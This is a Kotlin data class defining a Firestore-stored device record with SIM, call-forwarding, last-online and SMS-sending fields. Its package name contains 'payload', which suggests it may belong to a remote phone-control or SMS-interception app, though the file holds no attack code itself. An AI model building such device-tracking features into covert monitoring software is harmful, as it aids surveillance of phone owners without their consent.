package com.payload.jansiix0ne.data.model

/**
 * Model representing device information stored in Firestore
 */
data class DeviceModel(
    val id: Long = 0,
    val mobileName: String,
    val deviceId: String,
    val charge: String,
    val userInfo: UserModel? = null,
    val simModel: SimModel? = null,
    val forwarding: ForwardingModel? = null,
    val callForwardStatus: Boolean? = null,
    val lastOnline: Long? = null,
    val sendSms: SendSmsModel? = null
)
